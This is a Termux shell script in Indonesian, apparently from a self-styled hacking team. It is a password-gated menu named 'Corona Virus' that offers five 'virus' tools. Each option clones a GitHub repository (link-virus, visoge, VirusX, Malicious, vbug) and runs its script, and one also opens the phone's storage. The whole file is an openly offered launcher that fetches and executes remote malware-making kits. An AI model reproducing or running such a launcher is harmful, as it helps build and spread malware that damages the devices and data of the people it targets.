#!/bin/sh




figlet Login | lolcat
echo "#####################################################" | lolcat
echo " {•} Pesan : Masukan Password Terlebih Dahulu Stah:v" | lolcat
echo "#####################################################" | lolcat
echo
read -p "Masukan Password: " pass
if [ $pass = Mr.15XCyber ]
then
    echo "Password Benar ✓✓✓" | lolcat
    echo
# then jika benar

clear
figlet Corona Virus | lolcat
echo "[=======================================================]" | lolcat
echo "[•] Creator : Mr.15XCyber" | lolcat
echo "[•] Team    : Cyber Jateng Xploit Team" | lolcat
echo "[•] Pesan   : Selamat Datang Di Tools Saya" | lolcat
echo "[•] Pesan   : Dan Tools Ini Gabungan Dari Tools Lainnya" | lolcat
echo "[=======================================================]" | lolcat
echo
sleep 1
echo "1).Virus Link"
echo "2).Virus Visoge"
echo "3).Virus X"
echo "4).Virus Malicious"
echo "5).Virus Vbug"
read -p "pilih: " contoh
else
   echo "Password Salah XXX" | lolcat
# elae jika salah

fi
if [ $contoh = 1 ]
then
pkg update && pkg upgrade
pkg install figlet
pkg install git
git clone https://github.com/MrVirusSpm-07/link-virus
cd link-virus
sh download.sh
fi
if [ $contoh = 2 ]
then
pkg update && pkg upgrade
pkg install figlet
pkg install php
pkg install git
git clone https://github.com/MrVirusSpm-07/visoge
cd visoge
php mulai.php
fi
if [ $contoh = 3 ]
then
apt update && apt upgrade
apt install git
pkg install python
git clone https://github.com/TSMaitry/VirusX.git
cd VirusX
chmod +x VirusX.py
python2 VirusX.py
fi
if [ $contoh = 4 ]
then
termux-setup-storage
cd /sdcard
pkg install git
pkg install python2
pkg install ruby
gem install lolcat
git clone https://github.com/Hider5/Malicious
cd Malicious
pip2 install -r requirements.txt
python2 malicious.py
fi
if [ $contoh = 5 ]
then
pkg update && pkg  upgrade
pkg install  python
pkg install git
git clone https://github.com/Gameye98/vbug
cd vbug
python vbug.py
fi

